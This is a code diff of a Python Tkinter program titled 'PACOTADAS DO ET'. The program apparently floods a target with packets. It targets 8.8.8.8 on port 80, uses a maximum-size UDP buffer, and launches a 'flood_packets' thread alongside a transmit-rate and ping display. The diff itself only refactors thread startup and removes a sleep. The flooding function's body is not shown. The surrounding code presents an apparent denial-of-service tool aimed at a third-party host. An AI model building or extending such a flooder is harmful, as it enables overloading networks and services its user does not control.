@@ -6,7 +6,6 @@ import subprocess
 import socket
 import sys
 
-# CONFIGURAÇÃO (ajuste aqui)
 TARGET_IP = "8.8.8.8"
 TARGET_PORT = 80
 BUFFER_SIZE = 65507
@@ -46,9 +45,11 @@ def update_info():
         tx = get_tx_mbps()
         ping = get_ping(TARGET_IP)
         status_var.set(f"TX: {tx:.2f} MB/s    Ping: {ping}")
-        time.sleep(1)
 
-# GUI
+def start_threads():
+    threading.Thread(target=update_info, daemon=True).start()
+    threading.Thread(target=flood_packets, daemon=True).start()
+
 root = tk.Tk()
 root.title("PACOTADAS DO ET")
 root.geometry("400x200")
@@ -62,8 +63,5 @@ status_var = tk.StringVar()
 status_label = tk.Label(root, textvariable=status_var, font=("Courier", 14), bg="black", fg="white")
 status_label.pack(side="bottom", pady=10)
 
-# Threads
-threading.Thread(target=update_info, daemon=True).start()
-threading.Thread(target=flood_packets, daemon=True).start()
-
+start_threads()
 root.mainloop()
